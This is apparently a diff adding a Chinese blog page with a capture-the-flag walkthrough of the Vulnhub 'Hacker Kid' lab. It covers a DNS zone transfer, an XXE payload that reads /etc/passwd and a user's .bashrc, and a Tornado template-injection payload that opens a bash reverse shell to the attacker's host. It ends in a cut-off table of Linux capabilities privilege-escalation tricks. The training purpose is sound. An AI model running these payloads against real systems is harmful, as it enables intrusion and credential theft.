@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>我的技术与生活——vulnhub靶场HACKER KID:1.0.1 | zz</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/public.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/iconfont.css" />
+  <link rel="stylesheet" href="/css/APlayer.min.css" />
+  <script src="/js/APlayer.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.pjax.min.js"></script>
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <script>
+    document.title = `我的技术与生活——vulnhub靶场HACKER KID:1.0.1`
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
+      </div>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
+      </div>
+    </div>
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="http://example.com/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="http://example.com/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="http://example.com/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="http://example.com/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</header>
+
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"LazySysAdmin靶场渗透","path":"2025/10/13/LazySysAdmin靶场渗透/"},{"title":"CSRF","path":"2025/08/24/CSRF/"},{"title":"XXE","path":"2025/08/16/XXE/"},{"title":"SSRF漏洞","path":"2025/08/14/SSRF漏洞/"},{"title":"pop","path":"2025/07/07/pop/"},{"title":"babyserialize","path":"2025/07/07/babyserialize/"},{"title":"1zweb","path":"2025/07/09/1zweb/"},{"title":"XSS","path":"2025/08/23/XSS/"},{"title":"level-up","path":"2025/07/07/level-up/"},{"title":"渗透测试值工具kali","path":"2025/10/26/渗透测试工具kali/"},{"title":"vulnhub靶场HACKER KID:1.0.1","path":"2025/10/31/vulnhub靶场HACKER-KID-1-0-1/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">zz</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag">边清零边拥有</span>
+          <span class="main-left--tag"></span>
+        </div>
+      </div>
+    </div>
+  
+    <div>
+      <div class="main-left--motto">
+        <p>“前途与玫瑰，来日与方长"</p>
+        <p>”自能生羽翼，何必仰云梯“</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a target="_blank" rel="noopener" href="https://github.com/Aizener"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>10</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>11</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>3 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">我的工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>11 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>155天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container">
+
+
+  <link rel="stylesheet" href="/css/partial/article.css" />
+
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">vulnhub靶场HACKER KID:1.0.1</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
+            <a class="category-link" href="/categories/vulnhub%E9%9D%B6%E5%9C%BA/">Vulnhub靶场</a>
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            <a class="tag-link" href="/tags/DNS%E5%8C%BA%E5%9F%9F%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/" rel="tag">DNS区域漏洞靶场</a>
+          </div>
+          
+          <p class="article-info--date">日期：2025-10-31 20:18:19</p>
+        </div>
+        <img src="/imgs/default-cover.webp" alt="" class="article-cover">
+      </div>
+    </div>
+    <article class="article-content markdown-body">
+      <h2 id="DNS区域传输漏洞"><a href="#DNS区域传输漏洞" class="headerlink" title="DNS区域传输漏洞"></a>DNS区域传输漏洞</h2><p>原理：</p>
+<p>是指在DNS服务器配置不当的情况下，允许未经授权的客户端请求并获取整个DNS区域的数据记录。这种漏洞的存在使得攻击者可以轻松获取域名系统区域的数据记录，包括所有的域名和IP地址。</p>
+<p>成因：</p>
+<p>DNS区域传送（AXFR）是用于从一个DNS服务器将整个域名系统区域的数据记录传输到另一个DNS服务器的协议。通常情况下，只有备份服务器能够从主服务器获取数据，以实现数据同步。然而，如果DNS服务器配置不当，任何客户端都可以通过AXFR请求获取主服务器的数据。</p>
+<p>靶场安装：</p>
+<p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova">https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova</a></p>
+<p>导入</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/425f5ed425534affb7c08336d2b51258-17616646744101-17616648787372.png" alt="425f5ed425534affb7c08336d2b51258"></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p>扫描同网段下所有存活的主机（工具：kali） 因为靶机现在是NAT模式，并且我的VM也是自动获取ip的模式，所以在VM打开靶机之后，靶机就会被分 配一个ip地址，现在我们要得到这个ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.240.0/24</span><br></pre></td></tr></table></figure>
+
+<p>一直扫不出来，后来发现kali又出现问题了，eth0状态为不可用，我的网络根本用不了，经过长期的排错，我发现是物理主机的VMware NAT Service之前是停止状态的，给他重启一下就行了，eth0有线连接就又恢复了，验证，发现物理主机和虚拟机能互相ping通了</p>
+<p>下面重新开始扫本网段存活的主机</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/image-20251029225612834-17617497741671.png" alt="image-20251029225612834"></p>
+<p>已经可以看到我们的靶机ip了192.168.240.130</p>
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.240.130</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/image-20251029230836993-17617505182672.png" alt="image-20251029230836993"></p>
+<p>我们看到开放的端口有53，80，9999，53是dns的服务端口，80是http服务默认端口</p>
+<h4 id="收集页面信息"><a href="#收集页面信息" class="headerlink" title="收集页面信息"></a>收集页面信息</h4><p>从最常见的80端口入手</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/010d9f07ff7270331a61b7de257c54e3.png" alt="img"></p>
+<p>这个页面表面上看是没啥提示的，但是他说你越深挖我，就越能在你的服务器上找到我……继续挖我……继续挖我。</p>
+<p>说明可能还有啥隐藏起来的信息，那在这个界面我们就看看页面源码</p>
+<p>页面源码里面有两段注释代码，可以发现第二段给了提示</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/c805f082442ec49e31af348235d54690.png" alt="img"></p>
+<p>他说使用 GET 参数 page_no 来查看页面。</p>
+<p>那我们可以尝试在 URL 中加入 ?page_no&#x3D;数字 来访问不同页面。</p>
+<p>但是这么多数字我们手动一一来访问看页面有有没有有用的信息太慢了，我们直接用bp来爆破一下</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/a2a51ade75b16c504ade80507cb71948.png" alt="img"></p>
+<p>我们先访问一下page_no&#x3D;1发起请求，用bp拦截，拦下这个数据包后我们把这个数据包发到intruder这个模块开始爆破，</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/image-20251030201150701-17618263121501.png" alt="image-20251030201150701"></p>
+<p>配置好各项参数开始爆破</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/ebad1e492279cb2a581cbc8a6d986195.png" alt="img"></p>
+<p>爆破完成发现page_no&#x3D;21这个响应明显更大一些，肯定有信息，去访问一下</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/c9897c4112ae74f6b3628d4a3ea4b3fc.png" alt="img"></p>
+<p>发现一个域名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackers.blackhat.local</span><br></pre></td></tr></table></figure>
+
+<p>先放放，再去看看9999端口的那个界面下有啥</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/870848f08e76b510f4a182987981b6d7.png" alt="img"></p>
+<p>可以看到是一个登录界面，但是因为没有账号和密码，无法登录使用</p>
+<p>所以我们就要继续深挖刚才扫出来的域名</p>
+<p>用dig结合我们刚得到的域名继续挖掘信息（知道域名了，那就看看有没有对应的ip）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig hackers.blackhat.local @192.168.240.130</span><br></pre></td></tr></table></figure>
+
+<p>因为要继续通过我们刚得到的域名挖，那就是查询目标是hackers.blackhat.local,这个域名是通过靶机下的页面找到的，那就手动指定服务器ip为靶机ip</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/35181c1ddd83da25df2ba305f32d5bcf.png" alt="img"></p>
+<p>这次查询得知了我们这次查的域名居然是不存在的，那更别提查这个域名的IP了，但是没关系啊，刚才的权威回答告诉我们虽然这个域名不存在，但是blackhat.local这个DNS区是真实存在的，而且他的权威服务器就是我们的靶机，那我们就能换条路走了</p>
+<p>我们用axfr去拉取整个blackhat.localDNS区域的全部记录</p>
+<p>AXFR（DNS区域传输）：axfr 是q类型的一种: axfr类型是Authoritative Transfer的缩写，指请求传送 某个区域的全部记录。</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/02908b9c7edce903d94b425e620cee02.png" alt="img"></p>
+<p>这里我们能看到好多子域，但是他们都指向了192.168.14.143，目前来说我已经知道这些子域的子域ip是192.168.14.143，我去访问了这个ip，根本访问不了，那大概率这些子域不是我们要关注的主要对象</p>
+<p>此时发现还有一个域名突然出现了</p>
+<p>hackerkid.blackhat.local 是 AXFR 回显里唯一之前没出现过、且拼写正常的纯域名</p>
+<p>我们把这个域名记下来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackerkid.blackhat.local</span><br></pre></td></tr></table></figure>
+
+<p>我们现在去dig这个域名其实也查不到</p>
+<p>dig “问不到 A 记录” → 不再反复 dig 同一个子域浪费 time，不能用dig找到域名对应的ip，那我们就写 hosts 把域名→IP 固化（让系统能发 HTTP 请求），直接用浏览器去访问域名，看看能得到啥不</p>
+<p><strong>手动写本地解析文件&#x2F;etc&#x2F;hosts原因</strong></p>
+<p>因为我们这些已经得到的域名是只在我们靶机的DNS区域纯在，公网DNS里根本没有咱这些子域名，所以必须手动写本地解析文件</p>
+<p>否则咱这些域名根本不可能被访问到</p>
+<p>不写 &#x2F; 不改动<br>→ 系统去公网 DNS 问 .local<br>→ 根、顶级域都不认，最终 NXDOMAIN<br>→ 浏览器报 “无法解析域名” 或 “DNS_PROBE_FINISHED_NXDOMAIN”，根本发不出 HTTP 请求。</p>
+<p>因为我是在windos上进行渗透测试的，所以我直接在</p>
+<p>C:\Windows\System32\drivers\etc\hosts上加这两行域名。</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/1203565a7d19d94222227463dcda31a7.png" alt="img"></p>
+<h5 id="xxe漏洞"><a href="#xxe漏洞" class="headerlink" title="xxe漏洞"></a>xxe漏洞</h5><p>直接访问我们刚记下的域名之后发现一个登录界面</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/336e4794d2cb6152271e2f964e1cae99.png" alt="img"></p>
+<p>随便输入点信息后提交并且提起准备好bp开始抓包</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/ca7a209dc6dc1565b879994b547c968b.png" alt="img"></p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/0b953904e955f93fe51034a472d79003.png" alt="img"></p>
+<p>抓到数据包，发现是xml格式的，看到xml格式的数据包就要开始想是否存在xxe漏洞，这里我们</p>
+<p>测试一下看看有没有回显位，根据我们刚刚提交的信息得到的回应最有可能回显位就是email处，这里验证一下</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/44cd0da81c6d9888e04e72d7e8c2ce75.png" alt="img"></p>
+<p>测处email处就是回显位</p>
+<p>既然真的存在xxe漏洞，那我们就利用它去读取一下我们本地敏感文件</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ZY [</span><br><span class="line">        &lt;!ENTITY ddd SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        ]&gt;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        &amp;ddd;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/6f5dc96b5d98b2be5dc84109e2c79769.png" alt="img"></p>
+<p>我们用payload读取了靶机的全部用户，发现除了root用户，还有一个用户saket也有登录bash的权限，在众多用户都没有登录权限的时候，saket用户有，他直接脱颖而出，那必须得好好利用一下</p>
+<p>查看他的.bashrc文件看看里面是否有能利用的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.bashrc 就是 每次打开新 bash 终端时自动执行的“个人启动脚本”，里面通常是环境变量 + 别名 + 函数 + 提示符美化，偶尔夹带密码/后门/横向移动线索。</span><br><span class="line">Bash 就是 Linux 的‘命令行操作系统’；谁有 /bin/bash，谁就能开终端、跑脚本、留后门</span><br></pre></td></tr></table></figure>
+
+<p>尝试读取saket的.bashrc（这个文件一般在用户的家目录下&#x2F;home&#x2F;saket&#x2F;.bashrc）</p>
+<p>我用了file协议没读出来，下面尝试一下php协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/home/saket/.bashrc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/c535c1feaeda189c45346d5ee0f82656.png" alt="img"></p>
+<p>成功带出.bashrc文件，去base64解码</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/a978997bff29369e40beab8abb2016f4.png" alt="img"></p>
+<p>发现一组username，password</p>
+<p>想到上面用的9999端口拿到的登录界面，拿去登录一下</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/dfb3d92561c6bdc3fc3f8e4f187c22b1.png" alt="img"></p>
+<p>搞啥啊，居然登不上</p>
+<p>但是我坚信这组信息包有用的啊，经过尝试，发现把用户名换成<code>saket</code>就可以了。。。。</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/723241dcd64b8cc605b212696d2f497d.png" alt="img"></p>
+<p>页面提示，让我们告诉它名字，那就想到get传参</p>
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/35953e8f9f2dd8b884fbefb246ba7bf5.png" alt="img"></p>
+<h5 id="SSTI模板注入-反弹shell"><a href="#SSTI模板注入-反弹shell" class="headerlink" title="SSTI模板注入+反弹shell"></a>SSTI模板注入+反弹shell</h5><p>结合前面<code>nmap</code>扫描扫出来的信息知道这是一个基于tornado框架的web服务器，并且前面已经测试过了有get传参，敏感一点，看看是否有ssti模板注入漏洞</p>
+<p>测试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/badf539749d57090c480130e2281281e.png" alt="img"></p>
+<p>执行了，确认存在ssti模板注入漏洞</p>
+<p>那我们利用ssti来进行反弹shell</p>
+<p><strong>利用ssti模板注入漏洞进行反弹shell的原因</strong></p>
+<p>因为我们暂时只拿到了saket这个用户的用户名，我们并不知道用户密码，无法直接在靶机登录该普通用户拿到低权shell然后再通过其他方法达到提权的目的，所以我们利用反弹shell，直接将该用户能拿到的低权shell直接弹到kali上，不仅躲避了密码登录的麻烦，后续继续进行渗透也更加方便</p>
+<p>构造payload</p>
+<p>导入<code>os</code>模块执行命令（反弹shell的命令）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% import os %&#125;&#123;&#123;os.system(&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.240.99/6677 0&gt;&amp;1&quot;&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为payload里面有很多特殊字符是需要实实在在的起作用的，所以我们先提起进行一次url编码（不编码会被浏览器拦截）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=%7B%25+import+os+%25%7D%7B%7Bos%2Esystem%28%27bash+%2Dc+%22bash+%2Di+%26%3E+%2Fdev%2Ftcp%2F192%2E168%2E240%2E99%2F6677+0%3E%261%22%27%29%7D%7D</span><br></pre></td></tr></table></figure>
+
+<p>在kali上监听6677端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 6677</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/88490531427b3f54bbe71fdd4185137b.png" alt="img"></p>
+<p>成功反弹shell</p>
+<p>拿到saket用户的低权shell，后面继续提权，拿到root权限</p>
+<h3 id="提权（Capabilitie）"><a href="#提权（Capabilitie）" class="headerlink" title="提权（Capabilitie）"></a>提权（<code>Capabilitie</code>）</h3><p><code>Capabilitie</code>是一个Linux内核的功能，是做权限管理用的</p>
+<h4 id="Capabilitie"><a href="#Capabilitie" class="headerlink" title="Capabilitie"></a><code>Capabilitie</code></h4><h5 id="Capabilitie是什么"><a href="#Capabilitie是什么" class="headerlink" title="Capabilitie是什么"></a><code>Capabilitie</code>是什么</h5><p>1.定义<br>Capability &#x3D; 细粒度权限令牌<br>把传统“root 能做任何事”拆成无数小块，每块只干一件事（例如“只读打开 80 端口”）。<br>2.出现原因<br><code>setuid</code> 程序一旦被执行 &#x3D; 获得全部 root 权力 → 容易被滥用。<br>Capability 让进程“按需拿权”，丢权后连自己都改不回来。<br>3.一句话记忆<br>“root 是银行卡，Capability 是微信零钱——一次只给够用的小额。”</p>
+<h5 id="常见Capabilitie权限"><a href="#常见Capabilitie权限" class="headerlink" title="常见Capabilitie权限"></a>常见<code>Capabilitie</code>权限</h5><h6 id="一-提权爱考"><a href="#一-提权爱考" class="headerlink" title="一.提权爱考"></a>一.提权爱考</h6><table>
+<thead>
+<tr>
+<th>Capability</th>
+<th>一句话记忆</th>
+<th>典型利用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>CAP_SYS_ADMIN</strong></td>
+<td>“小 root”——挂载&#x2F;配额&#x2F;命名空间全包</td>
+<td>容器逃逸：<code>mount -t cgroup ...</code>；<code>unshare</code> 提权</td>
+</tr>
+<tr>
+<td><strong>CAP_DAC_OVERRIDE</strong></td>
+<td>无视文件权限 rwx</td>
+<td>任意读 &#x2F;etc&#x2F;shadow、写 cron</td>
+</tr>
+<tr>
+<td><strong>CAP_DAC_READ_SEARCH</strong></td>
+<td>跳过读&#x2F;目录检索权限</td>
+<td>遍历 &#x2F;root、暴力搜敏感文件</td>
+</tr>
+<tr>
+<td><strong>CAP_SETUID &#x2F; CAP_SETGID</strong></td>
+<td>随意改 UID&#x2F;GID</td>
+<td><code>setuid(0)</code> 直接 root</td>
+</tr>
+<tr>
+<td><strong>CAP_NET_BIND_SERVICE</strong></td>
+<td>绑 ≤1024 端口</td>
+<td>80&#x2F;443 无需 root</td>
+</tr>
+<tr>
+<td><strong>CAP_NET_RAW</strong></td>
+<td>原始套接字</td>
+<td>发 SYN Flood、伪造 TCP</td>
+</tr>
+<tr>
+<td><strong>CAP_SYS_PTRACE</strong></td>
+<td>任意进程调试</td>
+<td><code>ptrace</code> 注入 so → root</td>
+</tr>
+<tr>
+<td><strong>CAP_SYS_MODULE</strong></td>
+<td>插删内核模块</td>
+<td>编译 ko 提权（<code>dirtycow</code> 类）</td>
+</tr>
+<tr>
+<td><strong>CAP_SYS_CHROOT</strong></td>
+<td>chroot 逃逸</td>
+<td><code>chroot</code> + <code>mount</code> 组合拳</td>
+</tr>
+<tr>
+<td><strong>CAP_FOWNER</strong></td>
+<td>文件属主任意改</td>
+<td>把 &#x2F;etc&#x2F;passwd 改成自己 UID</td>
+</tr>
+</tbody></table>
+<h6 id="二-渗透常用"><a href="#二-渗透常用" class="headerlink" title="二.渗透常用"></a>二.渗透常用</h6><table>
+<thead>
+<tr>
+<th>Capability</th>
+<th>一句话记忆</th>
+<th>典型利用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CAP_NET_ADMIN</td>
+<td>网络接口&#x2F;路由&#x2F;防火墙配置</td>
+<td>开网卡、改 iptables</td>
+</tr>
+<tr>
+<td>CAP_SYS_BOOT</td>
+<td>重启系统</td>
+<td>直接 <code>reboot</code></td>
+</tr>
+<tr>
